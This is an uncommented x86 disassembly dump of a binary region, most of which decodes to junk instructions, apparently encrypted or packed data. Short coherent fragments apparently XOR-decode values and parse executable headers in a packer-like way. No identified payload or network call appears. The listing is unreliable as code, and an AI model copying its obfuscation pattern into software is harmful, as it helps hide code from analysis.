  40be01:	adc    ebp,DWORD PTR [ebx+edx*2]
  40be04:	pop    ecx
  40be05:	test   al,0x4
  40be07:	and    ch,BYTE PTR [eax]
  40be09:	out    dx,al
  40be0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be0b:	or     al,0xc5
  40be0d:	outs   dx,DWORD PTR ds:[esi]
  40be0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be0f:	mov    cl,0xf6
  40be11:	dec    eax
  40be12:	or     ebp,DWORD PTR ds:0x75279b96
  40be18:	mov    WORD PTR [esi+0xd],ss
  40be1b:	mov    edx,0xdcc25388
  40be20:	cmp    DWORD PTR [edx],0x2f
  40be23:	cmc    
  40be24:	stos   BYTE PTR es:[edi],al
  40be25:	push   esp
  40be26:	and    esi,DWORD PTR [ebp+0x32]
  40be29:	inc    eax
  40be2a:	sub    dh,BYTE PTR [esi-0x11ce0ede]
  40be30:	rcr    BYTE PTR [edi-0xa],cl
  40be33:	pushf  
  40be34:	jae    0x40be7e
  40be36:	bt     DWORD PTR [edi+0x3d5f0ebe],esi
  40be3d:	add    DWORD PTR [eax+0x54],esp
  40be40:	adc    al,0x86
  40be42:	mov    esi,0x615455b4
  40be47:	jmp    0xcc5697b3
  40be4c:	xchg   ebx,eax
  40be4d:	mov    edi,0x9f26bee2
  40be52:	call   0xce98a726
  40be57:	(bad)  
  40be58:	out    dx,eax
  40be59:	ret    
  40be5a:	sub    bl,dh
  40be5c:	call   0x71ba4da2
  40be61:	push   esi
  40be62:	and    DWORD PTR [eax-0x68],0x3c80ac5
  40be69:	push   ebp
  40be6a:	cmp    DWORD PTR [ecx],esp
  40be6c:	retf   
  40be6d:	das    
  40be6e:	leave  
  40be6f:	push   esi
  40be70:	repz mov ch,0x48
  40be73:	adc    ch,BYTE PTR [edi+0x19]
  40be76:	test   BYTE PTR cs:[esi+0x203579e6],ah
  40be7d:	sbb    bl,al
  40be7f:	xor    eax,0xf3f54754
  40be84:	sbb    BYTE PTR [ebx],al
  40be86:	sub    al,0x28
  40be88:	cmp    DWORD PTR [eax-0x1d],ecx
  40be8b:	into   
  40be8c:	ins    DWORD PTR es:[edi],dx
  40be8d:	sldt   esp
  40be90:	push   ebx
  40be91:	ins    BYTE PTR es:[edi],dx
  40be92:	pxor   mm1,QWORD PTR [edx+0x7f]
  40be96:	jl     0x40be9a
  40be98:	xor    eax,0x3e2f9855
  40be9d:	and    cl,BYTE PTR ds:0x2d3a74a7
  40bea3:	(bad)  
  40bea4:	mov    bl,0x8e
  40bea6:	dec    edx
  40bea7:	loop   0x40bf17
  40bea9:	aas    
  40beaa:	push   edi
  40beab:	jns    0x40bec6
  40bead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beae:	leave  
  40beaf:	cmp    edx,DWORD PTR [edx+0x1f6772c2]
  40beb5:	add    edi,DWORD PTR [ebx-0x259c987d]
  40bebb:	das    
  40bebc:	add    cl,BYTE PTR [ecx]
  40bebe:	sub    eax,0x9962c5e8
  40bec3:	and    bl,BYTE PTR [esi+0x14388e7e]
  40bec9:	jmp    0xc4ab:0xf1c4e9cb
  40bed0:	jb     0x40bf0e
  40bed2:	mov    WORD PTR [esi+0x4167feaa],?
  40bed8:	add    BYTE PTR [eax],al
  40beda:	rcl    BYTE PTR [esp+esi*2-0x43ada784],0x83
  40bee2:	inc    ebp
  40bee3:	adc    eax,DWORD PTR [ecx+esi*2]
  40bee6:	fwait
  40bee7:	mov    cl,0x4e
  40bee9:	nop
  40beea:	mov    edi,0xdedca2d7
  40beef:	cmp    al,0x75
  40bef1:	add    ecx,eax
  40bef3:	jp     0x40be79
  40bef5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bef6:	aam    0x68
  40bef8:	jno    0x40bf72
  40befa:	or     BYTE PTR [edx],bl
  40befc:	adc    dh,BYTE PTR [edi-0x13]
  40beff:	ins    BYTE PTR es:[edi],dx
  40bf00:	or     al,0x12
  40bf02:	add    esi,esi
  40bf04:	xor    ah,BYTE PTR [edx]
  40bf06:	dec    eax
  40bf07:	(bad)  
  40bf08:	enter  0x68c4,0x77
  40bf0c:	xchg   cl,dh
  40bf0e:	push   0xd
  40bf10:	scas   eax,DWORD PTR es:[edi]
  40bf11:	xchg   edi,eax
  40bf12:	pushf  
  40bf13:	mov    edi,ss
  40bf15:	fdivr  DWORD PTR [eax-0x28e97ed2]
  40bf1b:	adc    edi,esi
  40bf1d:	push   ecx
  40bf1e:	xor    eax,0x4cb6a892
  40bf23:	inc    eax
  40bf24:	push   cs
  40bf25:	je     0x40bef8
  40bf27:	int    0x56
  40bf29:	(bad)  
  40bf2a:	xchg   ebx,eax
  40bf2b:	int3   
  40bf2c:	mov    ebx,0x2a259855
  40bf31:	xchg   esi,eax
  40bf32:	div    BYTE PTR [ebx-0x15]
  40bf35:	shl    DWORD PTR [esi+0x184f695],0xd8
  40bf3c:	xor    DWORD PTR [edx-0x45],0xec5293fc
  40bf43:	popa   
  40bf44:	fmul   DWORD PTR [eax-0x6facf58c]
  40bf4a:	lds    edx,FWORD PTR [eax-0x48]
  40bf4d:	sbb    ebx,DWORD PTR [ebx-0xd]
  40bf50:	jmp    0x40bf99
  40bf52:	loop   0x40bfac
  40bf54:	out    dx,al
  40bf55:	and    ebp,esi
  40bf57:	jo     0x40bfbc
  40bf59:	pop    es
  40bf5a:	lods   eax,DWORD PTR ds:[esi]
  40bf5b:	in     eax,0x72
  40bf5d:	stc    
  40bf5e:	pop    ss
  40bf5f:	(bad)  
  40bf60:	cmp    DWORD PTR [ecx+ecx*8+0x7f],eax
  40bf64:	cmp    esi,DWORD PTR [esi-0x70]
  40bf67:	mov    ?,WORD PTR [edi-0x5]
  40bf6a:	add    ah,BYTE PTR [edi+0x2d49a30e]
  40bf70:	leave  
  40bf71:	int    0xea
  40bf73:	sub    al,0xd5
  40bf75:	mov    fs,WORD PTR [esi+eax*4]
  40bf78:	jmp    0x2661:0x9e40731c
  40bf7f:	inc    esp
  40bf80:	cmp    eax,0xa94b97fb
  40bf85:	cli    
  40bf86:	xchg   eax,ebx
  40bf88:	mov    dh,0x3
  40bf8a:	hlt    
  40bf8b:	pop    esi
  40bf8c:	loop   0x40bfbe
  40bf8e:	jne    0x40bf5e
  40bf90:	fsubp  st(3),st
  40bf92:	repnz fwait
  40bf94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf95:	(bad)  
  40bf97:	lea    ecx,[esi]
  40bf99:	jg     0x40bf3a
  40bf9b:	mov    eax,?
  40bf9d:	addr16 push cs
  40bf9f:	dec    esi
  40bfa0:	dec    ecx
  40bfa1:	rcr    DWORD PTR [ebx+edi*4-0x28],0xbd
  40bfa6:	dec    edx
  40bfa7:	ss inc esp
  40bfa9:	xchg   DWORD PTR fs:[ebx+0x50a4d013],ebp
  40bfb0:	je     0x40c02e
  40bfb2:	stos   BYTE PTR es:[edi],al
  40bfb3:	push   cs
  40bfb4:	out    0x7a,al
  40bfb6:	adc    BYTE PTR [ecx+ecx*2-0x66],ah
  40bfba:	mov    ah,0x69
  40bfbc:	jb     0x40c03d
  40bfbe:	ret    
  40bfbf:	js     0x40c00a
  40bfc1:	shl    dl,1
  40bfc3:	sahf   
  40bfc4:	ror    DWORD PTR ds:0xa0381956,cl
  40bfca:	ins    BYTE PTR es:[edi],dx
  40bfcb:	push   edx
  40bfcc:	popf   
  40bfcd:	sub    ebp,eax
  40bfcf:	pusha  
  40bfd0:	or     al,0x87
  40bfd2:	jo     0x40bfa8
  40bfd4:	loope  0x40bfc6
  40bfd6:	adc    edx,eax
  40bfd8:	loope  0x40bfd6
  40bfda:	pop    es
  40bfdb:	fnstsw WORD PTR [esi-0x4b]
  40bfde:	(bad)  
  40bfdf:	sbb    ebx,DWORD PTR [ebx-0x40]
  40bfe2:	xchg   BYTE PTR cs:[ebp+0x21b697c8],ch
  40bfe9:	adc    eax,0x2985821b
  40bfee:	sub    eax,0x3c00b0b9
  40bff3:	clc    
  40bff4:	cmp    eax,DWORD PTR [edx]
  40bff6:	jecxz  0x40c067
  40bff8:	sub    BYTE PTR [esi-0x24],al
  40bffb:	ins    BYTE PTR es:[edi],dx
  40bffc:	add    al,bh
  40bffe:	into   
  40bfff:	xor    al,0x9d
  40c001:	sbb    dh,dl
  40c003:	push   ebp
  40c004:	pop    ds
  40c005:	loopne 0x40c044
  40c007:	push   ds
  40c008:	rcl    DWORD PTR [ebp-0x8],0x73
  40c00c:	sub    DWORD PTR [eax-0x7f],edi
  40c00f:	pop    ds
  40c010:	dec    ebx
  40c011:	jle    0x40bfa9
  40c013:	stos   BYTE PTR es:[edi],al
  40c014:	adc    BYTE PTR [edi+0x33d27757],dl
  40c01a:	mov    dh,0xb9
  40c01c:	xchg   edi,eax
  40c01d:	mov    ecx,0x8dc88131
  40c022:	or     dh,al
  40c024:	je     0x40c06a
  40c026:	jmp    0x1575a660
  40c02b:	retf   0xad76
  40c02e:	in     eax,0x98
  40c030:	fbld   TBYTE PTR [eax-0x3c825663]
  40c036:	cmp    edi,DWORD PTR [edi-0x5f1d88bd]
  40c03c:	add    BYTE PTR [edx-0x11],al
  40c03f:	std    
  40c040:	in     al,0x73
  40c042:	and    eax,0x5afeb782
  40c047:	fdivr  st,st(2)
  40c049:	loopne 0x40c07c
  40c04b:	mov    esi,0xa260e27f
  40c050:	es ds pop ebx
  40c053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c054:	std    
  40c055:	mov    dl,0xf6
  40c057:	mov    esi,0x3bb67114
  40c05c:	in     eax,0x9
  40c05e:	call   0x1c123dfb
  40c063:	pop    ecx
  40c064:	sahf   
  40c065:	je     0x40c0dc
  40c067:	lds    esi,FWORD PTR [edi-0x5ce374eb]
  40c06d:	sub    bh,BYTE PTR [ebx+0x71]
  40c070:	mov    DWORD PTR [ebp-0x7a9f8c3],eax
  40c076:	enter  0xc9a4,0x51
  40c07a:	shl    DWORD PTR [ecx],cl
  40c07c:	push   0x2e3c9864
  40c081:	mov    dl,0x40
  40c083:	sti    
  40c084:	jb     0x40c00b
  40c086:	lahf   
  40c087:	push   eax
  40c088:	lock imul ebx,DWORD PTR [ebp+0x36],0x64
  40c08d:	lahf   
  40c08e:	push   ss
  40c08f:	jle    0x40c035
  40c091:	retf   
  40c092:	call   0xcd2f2139
  40c097:	popa   
  40c098:	add    eax,0x78f49369
  40c09d:	push   ss
  40c09e:	jmp    0x3ab61d67
  40c0a3:	(bad)  
  40c0a4:	pop    esp
  40c0a5:	add    dh,BYTE PTR [ebx+ebx*1]
  40c0a8:	stos   DWORD PTR es:[edi],eax
  40c0a9:	dec    edi
  40c0aa:	push   ss
  40c0ab:	pusha  
  40c0ac:	call   0xdc1f:0xd864dfef
  40c0b3:	add    esi,DWORD PTR [ecx+0x0]
  40c0b6:	jmp    0x2ed6:0x68433878
  40c0bd:	aaa    
  40c0be:	push   eax
  40c0bf:	pop    edi
  40c0c0:	sub    DWORD PTR [edx+eiz*8+0xf],ebx
  40c0c4:	lahf   
  40c0c5:	dec    ebp
  40c0c6:	sub    DWORD PTR [ebx],0xffffffc8
  40c0c9:	mov    ax,WORD PTR [ebp-0x4]
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	je     0x40c16c
  40c105:	cld    
  40c106:	lds    ebp,FWORD PTR [ecx-0x5]
  40c109:	jle    0x40c189
  40c10b:	cs jge 0x40c18c
  40c10e:	jle    0x40c0fc
  40c110:	inc    ebp
  40c111:	sub    al,0xa5
  40c113:	arpl   WORD PTR [edx+0x1cc75a8e],cx
  40c119:	dec    ebp
  40c11a:	ins    DWORD PTR es:[edi],dx
  40c11b:	ins    BYTE PTR es:[edi],dx
  40c11c:	xor    eax,0xc4907619
  40c121:	xchg   BYTE PTR es:[ebp-0x249b5380],al
  40c128:	sbb    BYTE PTR [ecx+0x3d],bh
  40c12b:	ficom  DWORD PTR [eax-0x7d]
  40c12e:	cmp    eax,DWORD PTR [ecx+edi*8]
  40c131:	dec    ebp
  40c132:	push   ss
  40c133:	dec    ebx
  40c134:	test   DWORD PTR [ebp+0x28],esi
  40c137:	idiv   edi
  40c139:	retf   0x4c9e
  40c13c:	push   ss
  40c13d:	lods   al,BYTE PTR ds:[esi]
  40c13e:	or     eax,0xe0a92c37
  40c143:	rcl    DWORD PTR [esi-0x47],0xda
  40c147:	int    0xf7
  40c149:	test   eax,0x435e74b5
  40c14e:	sub    dl,BYTE PTR [ebx]
  40c150:	push   ebp
  40c151:	pop    ebp
  40c152:	mov    al,0xe7
  40c154:	outs   dx,BYTE PTR ds:[esi]
  40c155:	clts   
  40c157:	dec    ecx
  40c158:	wbinvd 
  40c15a:	sub    ah,cl
  40c15c:	ins    BYTE PTR es:[edi],dx
  40c15d:	add    al,0x7d
  40c15f:	jno    0x40c0e4
  40c161:	jns    0x40c11e
  40c163:	pop    eax
  40c164:	ffree  st(5)
  40c166:	xchg   BYTE PTR [ebx+0x64],dh
  40c169:	(bad)  
  40c16a:	xchg   esp,eax
  40c16b:	pop    ebp
  40c16c:	mov    cl,0xf0
  40c16e:	loope  0x40c1a9
  40c170:	or     eax,0xac846a28
  40c175:	bound  esi,QWORD PTR [ebp-0x7e]
  40c178:	rcl    DWORD PTR [esi],cl
  40c17a:	mov    BYTE PTR [edi],bh
  40c17c:	ret    
  40c17d:	aad    0x59
  40c17f:	inc    esi
  40c180:	inc    ecx
  40c181:	mov    esp,0x152e86e6
  40c186:	jne    0x40c16b
  40c188:	loopne 0x40c18d
  40c18a:	ret    0x893e
  40c18d:	lods   eax,DWORD PTR ds:[esi]
  40c18e:	int    0x8e
  40c190:	fwait
  40c191:	pop    ebx
  40c192:	or     esi,edi
  40c194:	sbb    BYTE PTR [edx],0xa9
  40c197:	test   eax,ecx
  40c199:	bnd ja 0x40c11f
  40c19c:	ja     0x40c12a
  40c19e:	dec    edi
  40c19f:	mov    edx,esi
  40c1a1:	cmp    eax,0x3a204080
  40c1a6:	push   0xffffffa0
  40c1a8:	loop   0x40c1fc
  40c1aa:	xchg   edx,eax
  40c1ab:	xor    DWORD PTR [ecx+ecx*2],eax
  40c1ae:	test   DWORD PTR [edx+ecx*4+0x23],ecx
  40c1b2:	cmp    al,0xef
  40c1b4:	xor    eax,0x78e2c819
  40c1b9:	and    ecx,DWORD PTR [eax+0x24]
  40c1bc:	pusha  
  40c1bd:	mov    edi,0x12e514d0
  40c1c2:	lock and eax,0xfcea0b05
  40c1c8:	push   ebx
  40c1c9:	push   ebp
  40c1ca:	sti    
  40c1cb:	(bad)  
  40c1cc:	and    al,0x45
  40c1ce:	adc    al,0x59
  40c1d0:	loopne 0x40c232
  40c1d2:	out    dx,al
  40c1d3:	xor    bh,BYTE PTR [ecx]
  40c1d5:	sar    BYTE PTR ds:0x8edf2645,cl
  40c1db:	in     eax,0x29
  40c1dd:	xlat   BYTE PTR ds:[ebx]
  40c1de:	push   0x96a0638b
  40c1e3:	repz inc esp
  40c1e5:	mov    dl,0x43
  40c1e7:	xchg   edx,eax
  40c1e8:	adc    bl,cl
  40c1ea:	xor    ebp,DWORD PTR [edi-0x5ec5785a]
  40c1f0:	jmp    0x40c202
  40c1f2:	mov    dh,0xa9
  40c1f4:	fld    TBYTE PTR ds:[edx+0x1772c36e]
  40c1fb:	fbstp  TBYTE PTR fs:[eax]
  40c1fe:	out    0x2f,eax
  40c200:	inc    edx
  40c201:	push   edi
  40c202:	ficomp WORD PTR [edx]
  40c204:	fiadd  DWORD PTR [edx+0x36def62e]
  40c20a:	inc    edi
  40c20b:	fild   QWORD PTR [edi]
  40c20d:	shl    DWORD PTR [ebp+0x49453817],0x9c
  40c214:	call   0x83e53b11
  40c219:	mov    dl,0xa1
  40c21b:	inc    edi
  40c21c:	adc    BYTE PTR [edi-0x37],0xa8
  40c220:	inc    ebp
  40c221:	iret   
  40c222:	adc    edi,eax
  40c224:	add    al,BYTE PTR [ebx-0x52]
  40c227:	xchg   bx,ax
  40c229:	jmp    0x812e1480
  40c22e:	adc    ch,bl
  40c230:	or     ch,BYTE PTR [esi+edi*8-0x9]
  40c234:	call   DWORD PTR [edi+0x62d2a247]
  40c23a:	jo     0x40c2ac
  40c23c:	sti    
  40c23d:	jecxz  0x40c297
  40c23f:	and    eax,0x4bbd9dcf
  40c244:	mov    dh,0x68
  40c246:	dec    ebp
  40c247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c248:	not    BYTE PTR [edx+ebx*4]
  40c24b:	push   es
  40c24c:	shl    BYTE PTR [esi+esi*8+0x2d27bd05],1
  40c253:	arpl   WORD PTR [esi+0x8],di
  40c256:	or     ecx,DWORD PTR [edi]
  40c258:	scas   al,BYTE PTR es:[edi]
  40c259:	dec    eax
  40c25a:	int    0x74
  40c25c:	mov    edx,0xd06a88f9
  40c261:	fistp  WORD PTR [ecx+edi*4]
  40c264:	xchg   esp,eax
  40c265:	jecxz  0x40c299
  40c267:	in     al,0xe0
  40c269:	stc    
  40c26a:	fisub  WORD PTR [ebp-0x5dd16645]
  40c270:	dec    esp
  40c271:	inc    ebx
  40c272:	(bad)  
  40c273:	ror    BYTE PTR [esi],1
  40c275:	sub    eax,0x8d18591b
  40c27a:	adc    al,0xab
  40c27c:	xor    al,0xdc
  40c27e:	push   esi
  40c27f:	cs pusha 
  40c281:	push   esi
  40c282:	push   cs
  40c283:	jecxz  0x40c2e3
  40c285:	dec    ebp
  40c286:	in     eax,dx
  40c287:	mov    al,ds:0xf8c9bcae
  40c28c:	pop    ss
  40c28d:	pop    ebp
  40c28e:	lahf   
  40c28f:	add    al,0x94
  40c291:	retf   0x5a5
  40c294:	or     eax,0x7c2c0ba6
  40c299:	ror    DWORD PTR [edi+0xd],0xb0
  40c29d:	push   ecx
  40c29e:	mov    ah,0xac
  40c2a0:	in     eax,0x2
  40c2a2:	pop    esi
  40c2a3:	cs mov edx,edx
  40c2a6:	rol    DWORD PTR [eax],0x76
  40c2a9:	repnz retf 0xb7fa
  40c2ad:	in     al,0x56
  40c2af:	xchg   esp,eax
  40c2b0:	in     eax,0x3
  40c2b2:	test   eax,0x5e874d9c
  40c2b7:	add    ch,BYTE PTR [ebp-0x745fc80d]
  40c2bd:	sbb    edi,DWORD PTR [esi+0x6dd8b4b0]
  40c2c3:	push   ds
  40c2c4:	cmp    DWORD PTR ds:0x92188535,0xdbbc776a
  40c2ce:	mov    dh,0x98
  40c2d0:	les    esi,FWORD PTR [ebx-0x1a]
  40c2d3:	xchg   BYTE PTR [ebp-0x5f],ch
  40c2d6:	loope  0x40c2d0
  40c2d8:	ss repnz es or al,al
  40c2dd:	das    
  40c2de:	mov    DWORD PTR [edi],esp
  40c2e0:	call   0x3bdcc0c3
  40c2e5:	mov    bh,0x97
  40c2e7:	sar    BYTE PTR [ebp+0x3cdcec81],cl
  40c2ed:	popa   
  40c2ee:	fstp   QWORD PTR [ebx-0x48]
  40c2f1:	jnp    0x40c30d
  40c2f3:	das    
  40c2f4:	push   edi
  40c2f5:	mov    BYTE PTR [edx-0x5385d3c9],dl
  40c2fb:	or     al,0xbf
  40c2fd:	sahf   
  40c2fe:	mov    ss,WORD PTR [edx+0x2]
  40c301:	mov    edi,0x2a3c6286
  40c306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c307:	jbe    0x40c373
  40c309:	ret    
  40c30a:	xlat   BYTE PTR ds:[ebx]
  40c30b:	adc    BYTE PTR [ebx+esi*2-0x1c],bh
  40c30f:	xor    eax,0x54d52632
  40c314:	bound  ecx,QWORD PTR [ecx+0x40]
  40c317:	rsm    
  40c319:	imul   DWORD PTR [edi+0x4d]
  40c31c:	or     bl,ah
  40c31e:	pop    edx
  40c31f:	pop    eax
  40c320:	inc    ebp
  40c321:	mov    ds:0x29474f16,eax
  40c326:	rol    DWORD PTR [ecx-0x62],0x3c
  40c32a:	cmp    ecx,DWORD PTR [ebx]
  40c32c:	call   0x9ff6f694
  40c331:	jecxz  0x40c33a
  40c333:	cld    
  40c334:	and    eax,0xa4193854
  40c339:	xchg   esp,eax
  40c33a:	test   BYTE PTR [ecx-0x7b],bl
  40c33d:	cmp    al,BYTE PTR [edx]
  40c33f:	daa    
  40c340:	dec    ebx
  40c341:	sub    al,0xef
  40c343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c344:	jp     0x40c34b
  40c346:	mov    bl,BYTE PTR [eax-0x5bbd3cad]
  40c34c:	mov    dl,BYTE PTR [edi+ebp*4-0x83d8448]
  40c353:	sub    ch,BYTE PTR [esi+0x59f10a50]
  40c359:	mov    cl,0x26
  40c35b:	xlat   BYTE PTR ds:[ebx]
  40c35c:	and    al,0x6d
  40c35e:	leave  
  40c35f:	jne    0x40c358
  40c361:	(bad)  
  40c363:	inc    esp
  40c364:	jp     0x40c335
  40c366:	adc    bl,dh
  40c368:	jo     0x40c3c9
  40c36a:	call   FWORD PTR [esi+0x2f]
  40c36d:	pushf  
  40c36e:	out    dx,eax
  40c36f:	not    BYTE PTR [ebx-0x27]
  40c372:	mov    esi,0x77b3f681
  40c377:	pop    ss
  40c378:	cld    
  40c379:	add    eax,0x3d42823b
  40c37e:	dec    esp
  40c37f:	lds    ebp,FWORD PTR [eax+0x67]
  40c382:	jns    0x40c32d
  40c384:	or     eax,0x8cd49c34
  40c389:	push   0x35
  40c38b:	aaa    
  40c38c:	out    dx,eax
  40c38d:	sbb    ecx,ebp
  40c38f:	and    bh,BYTE PTR [eax+0x5e]
  40c392:	adc    DWORD PTR [ecx+ebp*2+0x73ea548f],ecx
  40c399:	in     al,0x8b
  40c39b:	and    esp,DWORD PTR ds:0x290d39b5
  40c3a1:	adc    eax,0xfefd1c4c
  40c3a6:	aaa    
  40c3a7:	mov    ds:0x35c6ccc5,eax
  40c3ac:	add    BYTE PTR [edi],cl
  40c3ae:	call   0xe3f1:0x908f91fe
  40c3b5:	dec    esi
  40c3b6:	jl     0x40c3c3
  40c3b8:	and    cl,BYTE PTR [esi+0x323ffcf5]
  40c3be:	aaa    
  40c3bf:	into   
  40c3c0:	ins    DWORD PTR es:[edi],dx
  40c3c1:	ins    BYTE PTR es:[edi],dx
  40c3c2:	add    eax,0x22f970b3
  40c3c7:	mov    al,ds:0x4457d24d
  40c3cc:	mov    ah,0x51
  40c3ce:	call   0x5646:0xdfb9306e
  40c3d5:	ja     0x40c357
  40c3d7:	mov    edi,0x82646a39
  40c3dc:	sbb    eax,0x27280393
  40c3e1:	adc    BYTE PTR ds:0xccf4d230,0x11
  40c3e8:	inc    esi
  40c3e9:	hlt    
  40c3ea:	shl    DWORD PTR [edx],cl
  40c3ec:	jge    0x40c3aa
  40c3ee:	neg    dh
  40c3f0:	sbb    ecx,DWORD PTR [ebx+0x1f]
  40c3f3:	(bad)  
  40c3f4:	sub    bh,cl
  40c3f6:	repnz cmp al,0x9c
  40c3f9:	ja     0x40c394
  40c3fb:	in     al,dx
  40c3fc:	push   edi
  40c3fd:	mov    al,ds:0x5fd92adf
  40c402:	shl    DWORD PTR [ecx-0x4a09de2d],0xbf
  40c409:	std    
  40c40a:	scas   al,BYTE PTR es:[edi]
  40c40b:	int    0xe9
  40c40d:	adc    bh,dh
  40c40f:	dec    edi
  40c410:	ret    
  40c411:	call   0x5d84:0x2c3b57c3
  40c418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c419:	aaa    
  40c41a:	call   0x4ebe:0x517a3d55
  40c421:	adc    ebp,ecx
  40c423:	push   es
  40c424:	dec    ecx
  40c425:	repz mov ecx,0xb80ab686
  40c42b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c42c:	popa   
  40c42d:	sbb    esi,0xffffffb1
  40c430:	xchg   edi,eax
  40c431:	test   eax,0xf149b8cd
  40c436:	ja     0x40c459
  40c438:	outs   dx,BYTE PTR ds:[esi]
  40c439:	jle    0x40c46f
  40c43b:	ins    BYTE PTR es:[edi],dx
  40c43c:	push   es
  40c43d:	dec    edi
  40c43e:	mov    ds:0x9b08848d,al
  40c443:	jb     0x40c477
  40c445:	add    BYTE PTR [esi-0x77],ah
  40c448:	inc    ebp
  40c449:	cld    
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi+0x2a]
  40c49b:	mov    ebp,0x8719bc1c
  40c4a0:	jle    0x40c520
  40c4a2:	cs jge 0x40c523
  40c4a5:	jle    0x40c474
  40c4a7:	ds pushf 
  40c4a9:	(bad)  
  40c4aa:	pop    edi
  40c4ab:	popa   
  40c4ac:	stos   DWORD PTR es:[edi],eax
  40c4ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4ae:	jge    0x40c526
  40c4b0:	(bad)  
  40c4b1:	push   cs
  40c4b2:	or     ecx,eax
  40c4b4:	inc    ebp
  40c4b5:	mov    ebp,0x20327e88
  40c4ba:	cmp    DWORD PTR ds:0x7ade2253,esi
  40c4c0:	dec    ebx
  40c4c1:	shl    DWORD PTR [edx+0x30],1
  40c4c4:	cmc    
  40c4c5:	push   0xed87a3d5
  40c4ca:	(bad)  
  40c4cb:	sub    bh,BYTE PTR [esi]
  40c4cd:	inc    edi
  40c4ce:	mov    gs,WORD PTR [ecx]
  40c4d0:	add    bl,dl
  40c4d2:	mov    bh,0xd0
  40c4d4:	mov    ds:0x5be7a8b7,al
  40c4d9:	imul   BYTE PTR [edx+0x6e3c37ea]
  40c4df:	(bad)  [ebp+edi*4+0x6d5aa411]
  40c4e6:	aad    0x2
  40c4e8:	sbb    BYTE PTR [esi],dl
  40c4ea:	cs cli 
  40c4ec:	fwait
  40c4ed:	mov    DWORD PTR [ecx+0x3d],0x5d8a4869
  40c4f4:	push   cs
  40c4f5:	and    BYTE PTR [edi-0x58f59709],bl
  40c4fb:	mov    ah,0x95
  40c4fd:	pop    edi
  40c4fe:	fdivr  st(2),st
  40c500:	dec    edi
  40c501:	lds    edi,FWORD PTR [esi-0x4f03ed89]
  40c507:	int3   
  40c508:	aad    0x18
  40c50a:	xlat   BYTE PTR ds:[ebx]
  40c50b:	jno    0x40c4b6
  40c50d:	jge    0x40c589
  40c50f:	pop    ecx
  40c510:	sub    DWORD PTR [edx-0x7761944d],edx
  40c516:	mov    eax,ds:0x5dc686f5
  40c51b:	or     BYTE PTR [ecx],bl
  40c51d:	xchg   ebp,eax
  40c51e:	stos   BYTE PTR es:[edi],al
  40c51f:	jmp    DWORD PTR [eax+0x5479b318]
  40c525:	sbb    al,BYTE PTR [esi]
  40c527:	inc    edi
  40c528:	pop    ss
  40c529:	fucomp st(0)
  40c52b:	leave  
  40c52c:	int    0x33
  40c52e:	fistp  WORD PTR [ebp+0x2f]
  40c531:	xchg   DWORD PTR [ecx+edi*2],edx
  40c534:	jp     0x40c55b
  40c536:	lahf   
  40c537:	or     al,BYTE PTR [ecx]
  40c539:	push   ebx
  40c53a:	aad    0x7a
  40c53c:	imul   ebx,DWORD PTR [ecx+ebx*4],0x5b
  40c540:	adc    dh,BYTE PTR [ebp+0x44b8bdda]
  40c546:	push   edi
  40c547:	fnsave [edi]
  40c549:	nop
  40c54a:	jecxz  0x40c549
  40c54c:	cmc    
  40c54d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c54e:	or     DWORD PTR [ebx+0x4b],esp
  40c551:	(bad)  
  40c552:	jg     0x40c4dc
  40c554:	xchg   ebp,eax
  40c555:	hlt    
  40c556:	in     eax,0xdf
  40c558:	js     0x40c505
  40c55a:	jp     0x40c4de
  40c55c:	jmp    0xf7fd:0x6f67ab09
  40c563:	jg     0x40c5de
  40c565:	cs dec ebx
  40c567:	(bad)  
  40c568:	cmovp  edx,DWORD PTR [ebx+esi*4]
  40c56c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c56d:	and    DWORD PTR [ecx+0xb7bac29],edx
  40c573:	int    0xe5
  40c575:	fucom  st(3)
  40c577:	fs xchg ecx,eax
  40c579:	leave  
  40c57a:	xor    eax,0x1edf73ee
  40c57f:	and    bl,0xdf
